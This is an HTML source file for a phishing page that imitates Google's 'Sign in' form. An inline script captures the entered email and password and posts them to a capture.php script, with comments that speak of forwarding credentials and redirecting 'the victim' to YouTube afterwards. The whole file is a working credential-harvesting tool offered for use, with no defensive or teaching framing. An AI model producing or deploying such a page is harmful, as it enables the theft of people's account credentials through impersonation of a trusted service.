<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Google Login Form</title>
</head>
<body>
    <div class="box">
        <div class="google-logo" title="Google"></div>
        <h2>Sign in</h2>
        <p>Use Your Google Account</p>
        <form action="capture.php" method="POST">
            <div class="inputBox">
                <input type="email" name="email" required="" onkeyup="this.setAttribute('value', this.value);" value="">
                <label>Email</label>
            </div>
            <div class="inputBox">
                <input type="password" name="password" required="" onkeyup="this.setAttribute('value', this.value);" value="">
                <label>Password</label>
            </div>
            <div class="forgot">
                <button type="button">Forgot your address?</button>
            </div>
            <input type="submit" name="sign-in" value="Sign In" onclick="captureCredentials()">
        </form>
    </div>
    <script>
        function captureCredentials() {
            var email = document.getElementsByName('email')[0].value;
            var password = document.getElementsByName('password')[0].value;

            // Forward credentials to your email
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'capture.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('email=' + email + '&password=' + password);

            // Redirect the victim to YouTube after capturing credentials
            window.location.href = 'https://www.youtube.com/';
        }
    </script>
</body>
</html>
